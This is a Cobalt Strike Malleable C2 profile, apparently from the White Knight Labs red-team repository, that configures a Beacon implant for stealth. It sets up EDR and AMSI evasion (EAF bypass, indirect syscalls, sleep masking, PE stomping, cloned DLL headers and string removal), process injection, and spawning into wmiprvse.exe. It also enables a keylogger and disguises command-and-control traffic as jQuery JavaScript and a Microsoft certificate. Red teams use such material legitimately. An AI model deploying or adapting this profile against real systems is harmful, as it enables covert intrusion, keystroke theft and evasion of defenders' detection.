## Author: Kleiton - White Knight Labs

################################################
## Auxiliary Settings
################################################
set sample_name "WKL C2 Profile";
set host_stage "false";  # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.
set pipename "Winsock2\\CatalogChangeListener-###-0";
set pipename_stager "TSVCPIPE-########-####-4###-####-############";
set useragent "<RAND>"; # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"; Use random Internet Explorer UA by default
set create_remote_thread "true"; # Allow beacon to create threads in other processes
set hijack_remote_thread "true"; # Allow beacon to run jobs by hijacking the primary thread of a suspeneded process
set tasks_max_size "2097152"; # Set to 2MB (in bytes) to avoid the OPSEC warning. Increase if needed.
set steal_token_access_mask "0"; # TOKEN_ALL_ACCESS (or use "11")
set tcp_frame_header "\x80";

################################################
## Beacon Sleep Settings
################################################
set sleeptime "30000";  # Choose a value that fits your needs. A great value is recommended.
set jitter "33";        # Default jitter factor (0-99%). A great value is recommended.

################################################
## SSH Banner
################################################
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "LOCAL\\cubeb-pipe-####-##";

################################################
## Beacon Config
################################################
stage {
    set allocator         "MapViewOfFile";
    set cleanup           "true";
    set rdll_loader       "PrependLoader"; #PrependLoader enable the use of eaf_bypass and rdll_use_syscalls
    set rdll_use_syscalls "true";
    set eaf_bypass        "true";
    set cleanup           "true";
    set data_store_size   "32";
    set sleep_mask        "true";
    set syscall_method    "indirect";
    set copy_pe_header    "true";          # Optional
    #set smartinject       "true";         # bypass EMET: pass key function pointers to its post-exploitation tools, when they're known (Disabled when PrependLoader is used)
    beacon_gate {
        All;
    }
    
    # OPSEC Note: Use the magic_header python script to generate values (https://github.com/WKL-Sec/Malleable-CS-Profiles/magic_mz.py)
    # For more details about the values, please refer to the official documentation: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_pe-memory-indicators.htm
    set magic_mz_x86 "RZME";
    set magic_mz_x64 "QY";
    
    set magic_pe        "##";     # Set to random values to avoid signature detections (limited to 2 characters)
    set userwx 	        "false";
    set sleep_mask	    "true";
    set stomppe	        "true";   # Otherwise easy detection
    set obfuscate	    "true";
    
    ### Module Stomping configuration ###
    #set module_x86 "wwanmm.dll";
    #set module_x64 "wwanmm.dll";
    #set stomppe    "true";        # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
    
    ### PE Header Clone Config - making the reflective DLL look like a specific DLL in memory ###
    ### Use dll_parse.py from WKL to parse the values from a DLL
    set name "ActivationManager.dll";
    set checksum "714538";
    set compile_time "18 Apr 2048 10:28:24";
    set entry_point "128240";
    set image_size_x64 "716800";
    set image_size_x86 "716800";
    set rich_header "\xb3\x03\xdf\x61\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xfe\x1a\x22\x32\x50\x62\xb1\x32\x92\x04\xb5\x33\xef\x62\xb1\x32\x92\x04\xb2\x33\xf4\x62\xb1\x32\x92\x04\xb4\x33\xeb\x62\xb1\x32\xf7\x62\xb0\x32\x10\x67\xb1\x32\x92\x04\xb0\x33\xff\x62\xb1\x32\x92\x04\xb1\x33\xf6\x62\xb1\x32\x92\x04\xbf\x33\xa5\x62\xb1\x32\x92\x04\x4c\x32\xf6\x62\xb1\x32\x92\x04\x4e\x32\xf6\x62\xb1\x32\x92\x04\xb3\x33\xf6\x62\xb1\x32";
    
    ### Beacon export obfuscation routing ###
    ### Change to your liking, as long as RC4 "128" is present. ###
    transform-obfuscate {
        lznt1;      # LZNT1 compression
        rc4 "128";  # RC4 encryption - Key length parameter: 8-2048
        xor "64";   # xor encryption - Key length parameter: 8-2048
        #base64;     # encodes using base64 encoding
    }
    
    ### String removal config ###
    # The following configuration will remove the presence of the strings from the exported beacon
    transform-x86 {
        strrep "%c%c%c%c%c%c%c%c%cMSSE-%d-server" "";
        strrep "Argument domain error (DOMAIN)" "";
        strrep "Argument singularity (SIGN)" "";
        strrep "Overflow range error (OVERFLOW)" "";
        strrep "Partial loss of significance (PLOSS)" "";
        strrep "Total loss of significance (TLOSS)" "";
        strrep "The result is too small to be represented (UNDERFLOW)" "";
        strrep "Unknown error" "";
        strrep "_matherr(): %s in %s(%g, %g)" "";
        strrep "(retval=%g)" "";
        strrep "Mingw-w64 runtime failure:" "";
        strrep "Address %p has no image-section" "";
        strrep "VirtualQuery failed for %d bytes at address %p" "";
        strrep "VirtualProtect failed with code 0x%x" "";
        strrep "Unknown pseudo relocation protocol version %d." "";
        strrep "Unknown pseudo relocation bit size %d." "";
    }
        
    transform-x64 {
        strrep "Argument domain error (DOMAIN)" "";
        strrep "Argument singularity (SIGN)" "";
        strrep "Overflow range error (OVERFLOW)" "";
        strrep "Partial loss of significance (PLOSS)" "";
        strrep "Total loss of significance (TLOSS)" "";
        strrep "The result is too small to be represented (UNDERFLOW)" "";
        strrep "Unknown error" "";
        strrep "_matherr(): %s in %s(%g, %g)" "";
        strrep "(retval=%g)" "";
        strrep "Mingw-w64 runtime failure:" "";
        strrep "Address %p has no image-section" "";
        strrep "VirtualQuery failed for %d bytes at address %p" "";
        strrep "VirtualProtect failed with code 0x%x" "";
        strrep "Unknown pseudo relocation protocol version %d." "";
        strrep "Unknown pseudo relocation bit size %d." "";
    }
}

################################################
## Post Exploitation Settings
################################################
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    set obfuscate "true";
    set smartinject "true";
    set cleanup "true";
    set amsi_disable "false"; #Recommended to Patch AMSI yourself
    set keylogger "GetAsyncKeyState";
    
    # Enable one of the following options for starting a spoofed thread
    #set threadhint "ntdll.dll!RtlUserThreadStart+0x21"
    #set threadhint "kernel32.dll!BaseThreadInitThunk+0x14"
}

################################################
## Process Injection
################################################
process-inject {
  set allocator "VirtualAllocEx"; #or NtMapViewOfSection ( NtMapViewOfSection option is for same-architecture injection only. VirtualAllocEx is always used for cross-arch memory allocations. )
  set startrwx "false";
  set userwx "false";
  set bof_allocator "HeapAlloc";  #Specify VirtualAlloc, MapViewOfFile, or HeapAlloc. 
  set bof_reuse_memory "true";
  set min_alloc "16384";

  #Use the prepend.py script from WKL github to generate a dynamic prepend value (support x64 only)
  #https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/prepend.py
  transform-x86 {
          prepend "\x90\x90";
          #append
  }

  transform-x64 {
          prepend "\x66\x87\xd2\x44\x48\x40\x90\x66\x87\xc9\x46\x66\x0f\x1f\x04\x00\x0f\x1f\x00\x45\x0f\x1f\x04\x00\x41\x87\xdb\x66\x87\xdb\x40\x42\x49\x87\xd2\x43\x4c\x87\xc9\x0f\x1f\x00\x47\x66\x90\x0f\x1f\x00";
          #append
  }

  # The following execution block can be considered safe to use 
  execute {
      ObfSetThreadContext "ntdll!TpReleaseCleanupGroupMembers+0x450";
      CreateThread "ntdll!RtlUserThreadStart+0x42";
      SetThreadContext;
  }
}

#------------
################################################
## SSL CERTIFICATE
################################################
## Description:
##    Signed or self-signed TLS/SSL Certifcate used for C2 communication using an HTTPS listener
## Defaults:
##    All certificate values are blank
## Guidelines:
##    - Best Option - Use a certifcate signed by a trusted certificate authority
##    - Ok Option - Create your own self signed certificate
##    - Option - Set self-signed certificate values
https-certificate {
# Self Signed Certificate Options
#       set CN       "*.azureedge.net";
#       set O        "Microsoft Corporation";
#       set C        "US";
#       set L        "Redmond";
#       set ST       "WA";
#       set OU       "Organizational Unit";
#       set validity "365";

# Imported Certificate Options
#        set keystore "domain.store";
#        set password "password";
}

################################################
## JQuery HTTP Profile
################################################
http-get {
        set verb "GET"; # GET / POST
        set uri "/css3/index2.shtml";  # Can be space separated string. Each beacon will be assigned one of these when the stage is built

        client {
                header "Accept" "text/html, application/xhtml+xml, image/jxr, */*";
                header "Accept-Encoding" "gzip, deflate";
                header "Accept-Language" "en-US; q=0.7, en; q=0.3";
                header "Connection" "keep-alive";
                header "DNT" "1";

                metadata {
                        base64url;
                        parameter "accept";
                }
        }

        server {
                header "Content-Type" "application/yin+xml";
                header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";

                output{
                        base64;
                        print;
                }
        }
}

http-post {
        set verb "POST"; # GET / POST
        set uri "/tools/family.html";
        client {
                header "Accept" "text/html, application/xhtml+xml, */*";
                header "Accept-Encoding" "gzip, deflate";
                header "DNT" "1";
                header "Content-Type" "application/x-www-form-urlencoded";

                id {
                        base64;
                        prepend "token=";
                        header "Cookie";
                }

                output{
                        base64url;
                        prepend "input=";
                        print;
                }
        }

        server {
                header "Content-Type" "text/vnd.fly";
                header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";

                output {
                        base64;
                        print;
                }
        }
}


################################################
## GET/POST Configuration
################################################
http-get "msrpc-azure" { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/compare/v1.44/VXK7P0GBE8"; # URI used for GET requests
    set verb "GET";

    client {

        header "Accept" "image/*, application/json, text/html";
        header "Accept-Language" "nb";
        header "Accept-Encoding" "br, compress";
	header "Access-X-Control" "True";

        metadata {
            mask; # Transform type
            base64url; # Transform type
            prepend "SESSIONID_XVQD0C55VSGX3JM="; # Cookie value
            header "Cookie";                                  # Cookie header
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            mask; # Transform type
            base64url; # Transform type
            prepend "/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */    !function(a,b){'object'==typeof module&&'object'==typeof module.exp    orts?module.exports=a.document?b(a,!0):function(a){if(!a.document)th    row new Error('jQuery requires a window with a document');return b(a    )}:b(a)}('undefined'!=typeof window?window:this,function(a,b){var c=    [],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.t    oString,k=i.hasOwnProperty,l={},m='2.2.4',n=function(a,b){return new     n.fn.init(a,b)},o=/^[suFEFFxA0]+|[suFEFFxA0]+$/g,p=/^-ms-/,q=/-    ([da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype    ={jquery:m,constructor:n,selector:'',length:0,toArray:function(){retu    rn e.call(this)},get:function(a){return null!=a?0>a?this[a+this.lengt    h]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.con    structor(),a);return b.prevObject=this,b.context=this.context,b},each:";
            append "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
            print;
        }

    }
}

http-post "msrpc-azure" { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/Construct/v1.85/JDX894ZM2WF1"; # URI used for POST block.
    set verb "POST"; # HTTP verb used in POST block. Can be GET or POST

    client {

        header "Accept" "application/xml, application/xhtml+xml, application/json";
        header "Accept-Language" "tn";
        header "Accept-Encoding" "identity, *";
	header "Access-X-Control" "True";

        id {
            mask; # Transform type
            netbiosu; # Transform type
            parameter "_KZZUEUVN";
        }

        output {
            mask; # Transform type
            netbios; # Transform type
            print;
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            mask; # Transform type
            netbiosu; # Transform type
            prepend "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            append "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            print;

        }
    }
}
